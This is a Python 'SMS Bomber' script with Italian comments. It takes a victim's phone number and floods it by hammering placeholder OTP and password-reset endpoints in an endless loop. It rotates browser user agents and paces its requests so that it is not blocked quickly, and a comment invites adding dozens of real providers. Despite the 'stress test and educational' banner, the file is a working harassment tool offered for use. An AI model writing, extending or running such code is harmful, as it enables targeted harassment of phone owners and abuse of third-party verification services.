#!/usr/bin/env python3
import asyncio
import aiohttp
import random
import sys
from colorama import Fore, Style, init

init(autoreset=True)

BANNER = f"""
{Fore.RED}███████╗███╗   ███╗███████╗    ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
{Fore.RED}██╔════╝████╗ ████║██╔════╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
{Fore.WHITE}███████╗██╔████╔██║███████╗    ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
{Fore.WHITE}╚════██║██║╚██╔╝██║╚════██║    ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
{Fore.RED}███████║██║ ╚═╝ ██║███████║    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
{Fore.RED}╚══════╝╚═╝     ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
{Fore.YELLOW}             [ SOLO PER TEST DI STRESS E SCOPI EDUCATIVI ]
"""

class SMSBomber:
    def __init__(self, target):
        self.target = target # Formato: 393331234567
        self.success = 0
        self.failed = 0
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36"
        ]

    async def provider_sample_1(self, session):
        # Esempio di provider: Servizio di registrazione/login fittizio
        url = "https://api.example-service.it/v1/auth/otp"
        payload = {"phone": self.target, "type": "sms"}
        headers = {"User-Agent": random.choice(self.user_agents)}
        try:
            async with session.post(url, json=payload, headers=headers, timeout=5) as resp:
                if resp.status == 200: self.success += 1
                else: self.failed += 1
        except: self.failed += 1

    async def provider_sample_2(self, session):
        # Esempio di provider: Recupero password fittizio
        url = f"https://www.service-test.com/api/reset-password?number={self.target}"
        headers = {"User-Agent": random.choice(self.user_agents)}
        try:
            async with session.get(url, headers=headers, timeout=5) as resp:
                if resp.status == 200: self.success += 1
                else: self.failed += 1
        except: self.failed += 1

    async def attack(self):
        print(f"{Fore.CYAN}[*] Avvio attacco su: {Fore.YELLOW}{self.target}")
        async with aiohttp.ClientSession() as session:
            while True:
                tasks = [
                    self.provider_sample_1(session),
                    self.provider_sample_2(session),
                    # Qui si possono aggiungere decine di altri provider reali
                ]
                await asyncio.gather(*tasks)
                print(f"{Fore.GREEN}[+] Inviati: {self.success} | {Fore.RED}[-] Falliti: {self.failed}", end="\r")
                await asyncio.sleep(1) # Intervallo per non essere bloccati subito

async def main():
    print(BANNER)
    if len(sys.argv) < 2:
        print(f"{Fore.WHITE}Utilizzo: python sms_bomber.py <numero_con_prefisso>")
        print(f"{Fore.WHITE}Esempio: python sms_bomber.py 393331234567")
        return

    target = sys.argv[1]
    bomber = SMSBomber(target)
    try:
        await bomber.attack()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Attacco interrotto dall'utente.")

if __name__ == "__main__":
    asyncio.run(main())
